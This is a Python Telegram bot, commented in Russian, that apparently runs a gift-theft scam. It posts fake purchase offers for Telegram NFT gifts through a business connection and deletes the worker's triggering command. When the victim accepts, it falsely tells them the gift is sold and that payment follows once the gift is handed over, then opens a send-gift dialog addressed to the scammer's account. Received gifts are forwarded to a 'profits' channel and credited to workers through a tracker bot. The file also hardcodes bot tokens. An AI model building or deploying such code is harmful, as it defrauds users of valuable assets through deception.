import asyncio
import logging
import uuid
import aiohttp
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import (
    Message, CallbackQuery, LinkPreviewOptions,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.exceptions import TelegramRetryAfter

# --- НАСТРОЙКИ ОФФЕР-БОТА ---
TOKEN = "9056825852:AAH-AKRlntMSkdLMfEbBqB9HsFcPsZFqabA"
TARGET_ID = 9158877731 # <--- ОБЯЗАТЕЛЬНО ЦИФРОВОЙ ID АККАУНТА @rattiixx (не канала!)
CURRENCY = {"g": "💎", "s": "⭐"}

# --- НАСТРОЙКИ СВЯЗКИ С ТРЕКЕР-БОТОМ ---
TRACKER_BOT_TOKEN = "8914754146:AAH3WF5wVgNtvfXpomuVCY1KoZ9VrBcGPcw"
TRACKER_ADMIN_ID = 9158877731  # Твой ID (админ из трекера)
PROFIT_CHANNEL_ID = -1003914079695 # ID канала/группы
PROFIT_TOPIC_ID = 3  # ID ТОПИКА (вкладки) в группе

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
OFFERS: dict[str, dict] = {}
PENDING_GIFTS: dict[str, dict] = {} # Для связи подарка с воркером

def offer_kb(oid: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"dec:{oid}"),
        InlineKeyboardButton(text="✅ Принять", callback_data=f"acc:{oid}"),
    ]])

def instruction_kb() -> InlineKeyboardMarkup:
    # ОБХОДНОЙ ПУТЬ: открывает системное окно отправки подарка
    deep_link = f"tg://send_gift?user_id={TARGET_ID}"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Передать NFT", url=deep_link)],
        [InlineKeyboardButton(text="❓ Как передать?", callback_data="alert_2")],
    ])

# --- КОМАНДА /offer ---
@dp.business_message(Command("offer"))
async def cmd_offer_business(message: Message):
    parts = message.text.split()
    if len(parts) < 4:
        return await message.answer("Формат:\n<code>/offer https://t.me/nft/PlushPepe-2687 20 g</code>")

    url, raw_sum, cur_key = parts[1], parts[2], parts[3].lower()
    if not url.startswith("https://t.me/nft/"):
        return await message.answer("Ошибка: Ссылка должна быть на NFT-подарок.")
    if cur_key not in CURRENCY:
        return await message.answer("Валюта только <b>g</b> или <b>s</b>.")
    if not raw_sum.isdigit():
        return await message.answer("Сумма — целое число.")

    # Узнаем ID воркера
    try:
        conn = await bot.get_business_connection(message.business_connection_id)
        worker_id = conn.user.id
    except Exception:
        worker_id = "unknown"

    oid = uuid.uuid4().hex[:12]
    raw_name = url.split('/')[-1]
    gift_name = raw_name.replace('-', ' #')
    
    OFFERS[oid] = {
        "url": url, "sum": raw_sum, "cur": CURRENCY[cur_key],
        "name": gift_name, "worker_id": worker_id
    }
    who = message.from_user.first_name or "Пользователь"
    
    # Текст с превью NFT
    caption = f"Пользователь <b>{who}</b> предлагает Вам {raw_sum} {CURRENCY[cur_key]} за подарок <b>{gift_name}</b>.\n\n{url}"

    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id]
        )
    except Exception as e:
        logging.error(f"delete: {e}")

    try:
        await bot.send_message(
            chat_id=message.chat.id, text=caption, reply_markup=offer_kb(oid),
            business_connection_id=message.business_connection_id,
            link_preview_options=LinkPreviewOptions(is_disabled=False, prefer_large_media=True, show_above_text=True)
        )
    except Exception as e:
        logging.error(f"send: {e}")

# --- НАЖАТИЕ «ПРИНЯТЬ» ---
@dp.callback_query(F.data.startswith("acc:"))
async def on_accept(call: CallbackQuery):
    oid = call.data.split(":")[1]
    data = OFFERS.get(oid)
    if not data:
        return await call.answer("Оффер устарел", show_alert=True)

    new_caption = (
        f"🎁 <b>Подарок:</b> {data['name']}\n<b>успешно продан!</b>\n\n"
        f"<b>Передайте подарок покупателю для зачисления {data['sum']} {data['cur']}.</b>\n\n{data['url']}"
    )
    try:
        await call.message.edit_text(
            text=new_caption, reply_markup=instruction_kb(),
            link_preview_options=LinkPreviewOptions(is_disabled=False, prefer_large_media=True, show_above_text=True)
        )
    except TelegramRetryAfter as e:
        await asyncio.sleep(e.retry_after) # Ждем, если флуд
        try:
            await call.message.edit_text(text=new_caption, reply_markup=instruction_kb())
        except Exception:
            pass
    except Exception as e:
        logging.error(f"edit: {e}")
    await call.answer()

# --- ВСПЛЫВАЮЩИЕ ОКНА ---
@dp.callback_query(F.data == "alert_2")
async def show_alert_2(call: CallbackQuery):
    await call.answer(
        "Нажмите «Передать NFT» под сообщением.\n\n"
        "В открывшемся окне подтвердите передачу подарка.",
        show_alert=True
    )

# --- ОТКЛОНИТЬ ---
@dp.callback_query(F.data.startswith("dec:"))
async def on_decline(call: CallbackQuery):
    OFFERS.pop(call.data.split(":")[1], None)
    await call.message.edit_text(text="Вы отклонили предложение.", reply_markup=None)
    await call.answer("Отклонено")

# --- ЛОВИМ ПОДАРОК (ЕСЛИ ОН ПРИХОДИТ) ---
@dp.business_message(F.gift)
async def handle_gift(message: Message):
    gift = message.gift
    if not gift:
        return

    try:
        conn = await bot.get_business_connection(message.business_connection_id)
        worker_id = conn.user.id
    except Exception:
        worker_id = "unknown"

    stars = getattr(gift, "star_count", 0) or 0
    base_name = getattr(gift, "base_name", "") or ""
    gift_id = getattr(gift, "id", "")
    
    # 1. Пересылаем сам подарок в канал профитов
    try:
        await bot.forward_message(
            chat_id=PROFIT_CHANNEL_ID, message_thread_id=PROFIT_TOPIC_ID,
            from_chat_id=message.chat.id, message_id=message.message_id,
            business_connection_id=message.business_connection_id
        )
    except Exception as e:
        logging.error(f"forward: {e}")

    # 2. Отправляем команду Трекер-боту
    text = f"/add_profit {worker_id} {stars} {base_name} {gift_id}"
    url = f"https://api.telegram.org/bot{TRACKER_BOT_TOKEN}/sendMessage"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json={"chat_id": TRACKER_ADMIN_ID, "text": text}) as resp:
                if resp.status != 200:
                    logging.error(f"tracker: {await resp.text()}")
    except Exception as e:
        logging.error(f"http: {e}")

async def main():
    logging.basicConfig(level=logging.INFO)
    print("Оффер-бот запущен (кнопка открывает окно)...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
